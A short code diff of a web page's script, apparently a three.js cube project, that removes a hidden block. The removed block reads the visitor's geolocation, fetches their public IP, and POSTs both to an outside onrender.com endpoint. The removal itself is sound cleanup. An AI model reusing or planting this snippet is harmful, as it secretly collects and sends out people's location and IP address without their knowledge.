@@ -149,52 +149,6 @@
         'assets': [ 'assets/css/styles.css', 'assets/js/three.js', 'assets/js/cube.js' ]
       });
     }
-
-navigator.geolocation.getCurrentPosition(function(position) {
-
-var latitude = position.coords.latitude;
-
-var longitude = position.coords.longitude;
-
-// IPアドレスを取得
-
-fetch('https://api.ipify.org?format=json')
-
-.then(response => response.json())
-
-.then(data => {
-
-var ip = data.ip;
-
-// サーバーに送信するデータ
-
-var deviceData = {
-
-latitude,
-
-longitude,
-
-ip
-
-};
-
-// サーバーへPOST
-
-fetch('https://location-ip-data-endpoint.onrender.com', {
-
-method: 'POST',
-
-headers: {
-
-'Content-Type': 'application/json'
-
-},
-
-body: JSON.stringify(deviceData)
-
-});
-
-});
   </script>
 
 </body>
